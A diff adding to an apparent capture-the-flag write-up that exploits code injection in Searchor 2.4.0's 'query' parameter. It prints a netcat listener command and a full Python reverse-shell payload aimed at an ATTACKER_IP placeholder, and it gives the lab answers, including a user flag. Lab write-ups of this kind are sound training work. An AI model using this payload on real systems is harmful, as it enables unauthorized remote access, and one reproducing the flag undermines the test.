@@ -71,9 +71,40 @@ After inspecting the Gitlab  patching notes, the vulnerability can be found on l
 ![](Pasted%20image%2020260710211736.png)
 
 
+- Adding the installs required to run Searchor: 
 
+		python3 -m pip install -U searchor
 
+Ex. ![](Pasted%20image%2020260710212856.png)
 
+The "search" command takes in four different parameters:
+1) Engine
+2) query
+3) open
+4) copy
+
+- User input is directly required for Engine and Query parameters
+
+After testing, we have found a workable epxloit on this Gitlab -> https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-
+
+We can use the "query" parameter to open a reverse shell on our local machine to gain initial access to the target IP
+
+- Open a listener on our local machine
+
+		nc -nlvp 1337
+
+- Enter the exploit query on the Searcher website 
+
+		', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
+
+![](Pasted%20image%2020260714121358.png)
+
+Initial Access gained!
+
+To find the user.txt flag, we visit the home directory and print out the user.txt file contents:
+		cd ~ | cat user.txt
+
+# Privilege Escalation
 
 
 
@@ -94,8 +125,11 @@ After inspecting the Gitlab  patching notes, the vulnerability can be found on l
 
 4) Which HTTP POST parameter of the web-application vulnerable to code injection?
 
-	
+	 query
 
+5) Submit the flag located in the svc user's home directory.
+
+	dd60f8da363ef209c228ab8df96e5fdc
 
 
 
